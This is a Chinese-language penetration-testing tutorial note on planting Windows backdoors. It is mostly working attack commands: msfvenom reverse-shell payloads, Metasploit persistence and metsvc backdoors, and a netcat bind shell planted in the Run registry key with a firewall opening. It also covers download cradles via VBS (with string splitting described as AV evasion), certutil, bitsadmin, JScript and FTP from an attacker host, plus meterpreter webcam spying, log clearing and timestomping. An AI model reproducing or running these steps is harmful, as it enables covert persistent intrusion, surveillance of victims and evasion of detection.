# 渗透测试基础14

# 认识系统后门（msf创建系统后门、利用nc上传文件安插后门、黑客操作关键、下载本质、使用vbs去远程下载文件、cmd,certutil下载文件、使用cmd,bitsadmin下载、使用js下载、使用ftp脚本、kali的meterpreter其他命令）

## meterpreter创建系统后门

1. 创建x64木马

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe > msf.exe
```

2. 生成木马后，放到桌面上。

```
use exploit/multi/handler
set payload windows/metsvc_bind_tcp
show options
set lport 192.168.1.120
exploit
```

上述木马是运行在内存里的，可以通过关闭进程然后干掉木马。



3. **通过服务启动**：

```
run metsvc -A    # 设定端口上传后门文件
```

【会开启一个31337端口，然后木马存在于C:\Users\ADMINI~1\APPData\Local\Teemp\FWnOkowKpbzilqs】

4. **如何利用后门**:

```
use exploit/multi/handler
set payload windows/metsvc_bind_tcp
set lport 31337
set rhost [对方的ip]
exploit
```

5. **或**：**在session中启动利用后门**

   ```
   run persistence -A -S -U -i 60 -p 4321 -r [黑客ip]
   # 安插一个永久性后门，60s上线一次，使用4321端口
   
   sessions
   # 发现多了一个session6
   
   sessions -i 6
   # 进入session
   
   getuid
   getsystem
   getuid
   
   # 然后重启/注销
   ```

【如果msf关闭了，下次重开】

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lport 4321
set lhost [自己ip]
exploit
```

7. 重启回来登录后，我们再重开msf，也可以监听。
8. 即使`sessions -k [id] `【干掉session id后】，过了60s还会回来



## 利用上传文件安插后门：

安插木马后



利用nc：

进入一个session中：

```
upload /root/nc.exe c:\\
```



查看注册表里有什么：

```
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
```

对应：

![image-20220111123210834](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111123210834.png)



把nc放到自动启动里：

```
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'c:\nc.exe -Ldp 444 -e cmd.exe'
```



查看代码写的对不对：

```
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc
```



查看防火墙状态：

```
shell
netsh firewall show opmode
```



添加一个防火墙规则允许444端口通过：

```
sh
netsh firewall add portopening TCP 444 "FireWall" ENABLE ALL
```



目标主机重启之后：

```
nc -v [目标ip] 444
```



然后即可连接上。



## 拓展：

注册表修改的内容可以在msconfig的启动选项卡里看到
可以考虑使用自解压的方法进行伪装...

**黑客操作的关键**：利用合法软件去进行操作

**下载的本质**：把对方服务器上所存放的二进制代码原封不动地根据http 协议或其他协议复制到自己的硬盘上。



## 使用vbs去远程下载文件:

比如在自己网页上创建一个haha.txt文件当作木马。



创建一个a.vbs：

```
set a=createobject("adod"+"b.stream"):set w=createobject("micro"+"soft.xmlhttp"):w.open"get",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2

# 创建对象a【"adod"+"b.stream"等同于adodb.stream，拆分是为了免杀】
# get传输
# 参数为0
# 表示下载0，保存到1的地方
```

cmd运行：

```
cscript a.vbs http://www.xx.com/haha.txt c:\b.txt
cscript a.vbs [参数0：http://www.xx.com/haha.txt] [参数1：c:\b.txt]
# 下载0保存到1
```

或cmd使用echo直接写：

```
echo set a=createobject("adod"+"b.stream"):set w=createobject("micro"+"soft.xmlhttp"):w.open"get",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 >> a.vbs
```

容易被杀毒软件查到



## cmd,certutil下载文件：

```
certutil -urlcache -split -f http://www.xx.com/haha.txt

# 会下载到本目录
```



有一个弊端：
每次下载的时候，都有留存，导致留下入侵痕迹，所以每次下载之后，都要清理痕迹:

```
certutil -urlcache -split -f http://www.xx.com/haha.txt delete
```



除了下载文件还可以校验hash值：

```
certutil -hashfile c:\xxx.exe
```

如果文件被动过，hash值就会改变



除了下载文件还可以加密解密文件：

```
certutil -encode c:\haha.txt c:\haha-en.txt
certutil -decode c:\haha-en.txt c:\haha-de.txt
```



## 使用cmd,bitsadmin下载：

下载主命令：

```
bitsadmin /rawreturn /transfer down http://www.xx.com/haha.txt c:\haha.txt
```



提高下载主命令的优先级（下载大型文件）:

```
bitsadmin /setpriority down foreground
```



## 使用js下载：

创建一个a.js

```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET",WScript.Arguments(0),/*async=*/false);WinHttpReq.Send();  # 发送请求
WScript.Echo(WinHttpReq.ResponseText);  # 返回

# 然后cmd：
cscript /nologo a.js http://www.xx.com/haha.txt >> 123.txt
# 适用于下载脚本
```



创建一个a.js下载后直接保存为文件:

```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET",WScript.Arguments(0),/*async=*/false);WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile("abc.exe");

# cmd：
cscript /nologo a.js http://www.xx.com/aa.exe
```

较可靠



## 使用ftp脚本:

创建一个a.bat

```
echo open [黑客ip] > ftp.txt
echo test>>ftp.txt
echo 123>>ftp.txt
echo binary>> ftp.txt
echo get haha.txt>> ftp.txt
echo bye >> ftp.txt
```

创建一个haha.txt

```
*CODE:\
```

双击bat文件会得到一个txt文件。

然后再cmd里把得到的txt文件内容当作一个脚本去执行：

```
ftp -s:ftp.txt
```



## kali的meterpreter其他命令：

```
uictl [enable/disable] [keyboard/mouse/all]   # 开启/停用键盘/鼠标

webcam_list    # 查看摄像头
webcam_snap    # 通过摄像头拍照
webcam_stream   # 通过摄像头开启视频

execute    # 在目标上执行文件
execute -H -i -f [exe文件]    # 创建新的隐藏、可交互的、命令：.exe
cmd.exe
execute -H -i -f cmd.exe    # 创建新的隐藏、可交互的、命令：cmd.exe

getpid    # 获取当前进程的pid【进程的id】
ps     # 查看活跃进程
migrate [pid]    # 将meterpreter转移到某个pid中[附着]
kill [pid]     # 杀死某个进程

clearev    # 清除日志，清除windows里的应用程序日志、系统日志、安全日志。但会留下痕迹

timestomp -v c://a.exe    # 查看c盘的a.exe的时间戳
timestomp c://b.exe -f c://a.exe    # 将a.exe的时间戳复制给b.exe
```



